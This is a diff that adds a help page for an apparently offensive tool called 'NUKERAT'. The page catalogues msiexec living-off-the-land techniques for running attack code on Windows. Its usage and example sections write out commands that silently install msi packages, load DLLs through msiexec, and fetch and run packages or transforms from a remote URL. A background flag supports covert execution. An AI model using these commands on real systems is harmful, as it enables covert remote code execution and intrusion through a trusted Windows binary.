@@ -1,0 +1,26 @@
+ABOUT
+    Windows utility to execute msi files. LOLBAS covers execute
+    custom made msi file with attack code, execute custom made msi
+    file with attack code from remote server, and related
+    techniques.
+
+USAGE:
+    msiexec /quiet /i {PATH:.msi}
+    msiexec /q /i {REMOTEURL}
+    msiexec /y {PATH_ABSOLUTE:.dll}
+    msiexec /z {PATH_ABSOLUTE:.dll}
+    msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
+
+EXAMPLES:
+    msiexec /quiet /i {PATH:.msi}
+    msiexec /q /i {REMOTEURL}
+    msiexec /y {PATH_ABSOLUTE:.dll}
+    msiexec /z {PATH_ABSOLUTE:.dll}
+    msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    msiexec /quiet /i {PATH:.msi}
